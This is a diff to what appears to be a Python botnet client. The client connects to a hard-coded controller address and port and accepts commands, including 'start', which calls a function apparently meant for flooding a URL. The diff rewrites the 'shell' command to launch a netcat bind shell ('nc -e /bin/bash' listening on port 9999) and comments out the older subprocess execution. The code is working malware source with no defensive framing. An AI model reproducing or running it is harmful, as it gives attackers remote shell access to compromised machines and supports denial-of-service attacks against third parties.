@@ -1,7 +1,7 @@
 import socket, os, requests, subprocess
 
 ip = '10.9.1.23'
-port = 6664
+port = 6666
 
 def doz(url):
 	try:
@@ -34,10 +34,13 @@ def c_listen():
 		elif cmd == 'start':
 			doz(url)
 		elif cmd == 'shell':
+			#con.send('shell command not working yet but you can do net bind shell ;)')
+			con.send('connected!'.encode())
+			os.system('nc -e /bin/bash -lvnp 9999 &')
 			#con.send('zhell'.encode())
-			cmd = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
-			con.send(cmd.stdout.read())
-			con.send(cmd.stderr.read())
+			#cmd = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
+			#con.send(cmd.stdout.read())
+			#con.send(cmd.stderr.read())
 		else:
 			con.send('command not found!'.encode())
 
